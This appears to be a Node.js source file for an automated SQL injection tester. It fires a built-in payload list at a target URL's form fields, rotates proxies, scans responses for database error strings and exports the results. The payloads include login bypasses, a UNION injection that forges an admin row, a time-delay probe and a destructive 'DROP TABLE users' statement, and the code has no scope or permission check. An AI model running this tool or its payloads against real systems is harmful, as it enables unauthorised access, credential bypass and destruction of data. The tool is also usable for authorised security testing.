const axios = require('axios');
const chalk = require('chalk');
const fs = require('fs');

class SQLInjection {
    constructor(config, proxies = []) {
        this.config = config;
        this.proxies = proxies;
        this.results = [];
        this.currentProxyIndex = 0;
    }

    getProxy() {
        if (!this.config.useProxy || this.proxies.length === 0) {
            return null;
        }
        const proxy = this.proxies[this.currentProxyIndex];
        this.currentProxyIndex = (this.currentProxyIndex + 1) % this.proxies.length;
        return {
            host: proxy.host,
            port: proxy.port,
            protocol: proxy.protocol,
        };
    }

    loadPayloads() {
        try {
            if (this.config.payloadFile && fs.existsSync(this.config.payloadFile)) {
                const data = fs.readFileSync(this.config.payloadFile, 'utf-8');
                return JSON.parse(data);
            } else {
                console.log(chalk.yellow('⚠️  Payload file not found, using default payloads'));
                return [
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "admin' --",
                    "' OR 'a'='a",
                    "1' UNION SELECT NULL--",
                    "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'--",
                    "1'; DROP TABLE users--",
                    "' OR '1'='1' /*",
                    "admin'/*",
                    "' WAITFOR DELAY '00:00:05'--",
                ];
            }
        } catch (error) {
            console.log(chalk.red(`✗ Error loading payloads: ${error.message}`));
            return [];
        }
    }

    async testPayload(field, payload) {
        const config = {
            method: 'POST',
            url: this.config.targetUrl,
            data: { [field]: payload },
            timeout: 5000,
            validateStatus: () => true,
        };

        const proxy = this.getProxy();
        if (proxy) {
            config.proxy = proxy;
        }

        try {
            const response = await axios(config);
            return {
                success: true,
                status: response.status,
                data: response.data,
                headers: response.headers,
            };
        } catch (error) {
            return {
                success: false,
                error: error.message,
            };
        }
    }

    analyzeResponse(response, payload) {
        const vulnerabilities = [];

        if (!response.success) {
            return vulnerabilities;
        }

        const dataString = typeof response.data === 'string' ?
            response.data.toLowerCase() :
            JSON.stringify(response.data).toLowerCase();

        const sqlErrorPatterns = [
            'sql syntax',
            'mysql_fetch',
            'pg_query',
            'sqlite_query',
            'ora-',
            'postgresql',
            'syntax error',
            'mysql error',
            'unclosed quotation',
            'quoted string not properly terminated',
            'error in your sql syntax',
            'warning: mysql',
            'valid mysql result',
            'sqlstate',
            'db2 sql error',
            'odbc',
            'jdbc',
            'cli driver',
        ];

        let hasError = false;
        let matchedPattern = null;

        for (const pattern of sqlErrorPatterns) {
            if (dataString.includes(pattern)) {
                hasError = true;
                matchedPattern = pattern;
                break;
            }
        }

        if (hasError) {
            vulnerabilities.push({
                type: 'SQL_ERROR_DISCLOSURE',
                severity: 'HIGH',
                description: `SQL error pattern detected: "${matchedPattern}"`,
                payload,
            });
        }

        if (response.status === 500) {
            vulnerabilities.push({
                type: 'SERVER_ERROR',
                severity: 'MEDIUM',
                description: 'Server error (500) triggered by SQL payload',
                payload,
            });
        }

        const suspiciousPatterns = [
            'database',
            'table',
            'column',
            'record',
            'query',
        ];

        let suspiciousCount = 0;
        for (const pattern of suspiciousPatterns) {
            if (dataString.includes(pattern)) {
                suspiciousCount++;
            }
        }

        if (suspiciousCount >= 2) {
            vulnerabilities.push({
                type: 'SUSPICIOUS_RESPONSE',
                severity: 'LOW',
                description: 'Response contains database-related keywords',
                payload,
            });
        }

        return vulnerabilities;
    }

    async test() {
        console.log(chalk.bold.cyan('\n💉 SQL Injection Tester Started\n'));
        console.log(chalk.gray('='.repeat(60)));
        console.log(chalk.white(`Target: ${this.config.targetUrl}`));
        console.log(chalk.white(`Fields: ${this.config.fields.join(', ')}`));
        console.log(chalk.white(`Max Attempts: ${this.config.maxAttempts || 'Unlimited'}`));
        console.log(chalk.gray('='.repeat(60)));

        const payloads = this.loadPayloads();

        if (payloads.length === 0) {
            console.log(chalk.red('\n✗ No payloads available'));
            return { success: false, error: 'No payloads' };
        }

        console.log(chalk.white(`\nLoaded ${payloads.length} SQL injection payloads`));

        const startTime = Date.now();
        let attempts = 0;
        const maxAttempts = this.config.maxAttempts || Infinity;
        const allResults = [];
        let totalVulnerabilities = 0;

        console.log(chalk.yellow('\n🔍 Testing SQL injection payloads...\n'));

        for (const field of this.config.fields) {
            console.log(chalk.cyan(`\nTesting field: ${field}`));

            for (const payload of payloads) {
                if (attempts >= maxAttempts) {
                    console.log(chalk.yellow('\n⚠️  Max attempts reached'));
                    break;
                }

                attempts++;
                process.stdout.write(`\r${chalk.cyan(`[${attempts}] Testing payload...`.padEnd(70))}`);

                const response = await this.testPayload(field, payload);
                const vulnerabilities = this.analyzeResponse(response, payload);

                const resultEntry = {
                    timestamp: new Date().toISOString(),
                    field,
                    payload,
                    success: response.success,
                    status: response.status,
                    error: response.error || null,
                    vulnerabilities,
                };

                allResults.push(resultEntry);

                if (vulnerabilities.length > 0) {
                    totalVulnerabilities += vulnerabilities.length;
                    console.log(chalk.red(`\n⚠️  VULNERABLE - ${field} with payload: ${payload.substring(0, 50)}${payload.length > 50 ? '...' : ''}`));
                    vulnerabilities.forEach(vuln => {
                        console.log(chalk.yellow(`  • ${vuln.type} (${vuln.severity}): ${vuln.description}`));
                    });
                } else if (!response.success) {
                    console.log(chalk.red(`\n✗ ${field} - Error: ${response.error}`));
                }

                if (this.config.delay) {
                    await new Promise(resolve => setTimeout(resolve, this.config.delay));
                }
            }

            if (attempts >= maxAttempts) break;
        }

        const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
        const successful = allResults.filter(r => r.success).length;

        console.log(chalk.bold.cyan('\n\n📊 SQL Injection Test Summary\n'));
        console.log(chalk.gray('='.repeat(60)));
        console.log(chalk.white(`Total Tests: ${attempts}`));
        console.log(chalk.green(`Successful: ${successful}`));
        console.log(chalk.red(`Failed: ${attempts - successful}`));

        if (totalVulnerabilities > 0) {
            console.log(chalk.red(`\n⚠️  Vulnerabilities Found: ${totalVulnerabilities}`));

            const vulnByType = {};
            allResults.forEach(r => {
                r.vulnerabilities.forEach(v => {
                    vulnByType[v.type] = (vulnByType[v.type] || 0) + 1;
                });
            });

            console.log(chalk.yellow('\nVulnerability Breakdown:'));
            Object.entries(vulnByType).forEach(([type, count]) => {
                console.log(chalk.white(`  • ${type}: ${count}`));
            });

            const vulnByField = {};
            allResults.forEach(r => {
                if (r.vulnerabilities.length > 0) {
                    vulnByField[r.field] = (vulnByField[r.field] || 0) + r.vulnerabilities.length;
                }
            });

            console.log(chalk.yellow('\nVulnerable Fields:'));
            Object.entries(vulnByField).forEach(([field, count]) => {
                console.log(chalk.white(`  • ${field}: ${count} issues`));
            });
        } else {
            console.log(chalk.green('\n✓ No SQL injection vulnerabilities detected'));
        }

        console.log(chalk.gray(`\nTime elapsed: ${elapsed}s`));
        console.log(chalk.gray('='.repeat(60)));

        const finalResults = {
            timestamp: new Date().toISOString(),
            targetUrl: this.config.targetUrl,
            fields: this.config.fields,
            totalTests: attempts,
            successful,
            failed: attempts - successful,
            vulnerabilitiesFound: totalVulnerabilities,
            timeElapsed: elapsed,
            tests: allResults,
        };

        this.results.push(finalResults);

        console.log(chalk.bold.green('\n✅ SQL Injection Testing Complete!\n'));

        return finalResults;
    }

    run() {
        return this.test();
    }

    exportJSON(filename) {
        fs.writeFileSync(filename, JSON.stringify(this.results, null, 2));
        console.log(chalk.green(`\n✅ Results exported to ${filename}`));
    }

    exportCSV(filename) {
        const csvRows = ['Timestamp,Field,Payload,Success,Status,Vulnerability Type,Severity,Error'];

        this.results.forEach(result => {
            result.tests.forEach(test => {
                if (test.vulnerabilities.length > 0) {
                    test.vulnerabilities.forEach(vuln => {
                        csvRows.push(
                            `${test.timestamp},"${test.field}","${test.payload.replace(/"/g, '""')}",${test.success},${test.status || ''},"${vuln.type}","${vuln.severity}","${test.error || ''}"`
                        );
                    });
                } else {
                    csvRows.push(
                        `${test.timestamp},"${test.field}","${test.payload.replace(/"/g, '""')}",${test.success},${test.status || ''},"","","${test.error || ''}"`
                    );
                }
            });
        });

        fs.writeFileSync(filename, csvRows.join('\n'));
        console.log(chalk.green(`\n✅ Results exported to ${filename}`));
    }
}

module.exports = SQLInjection;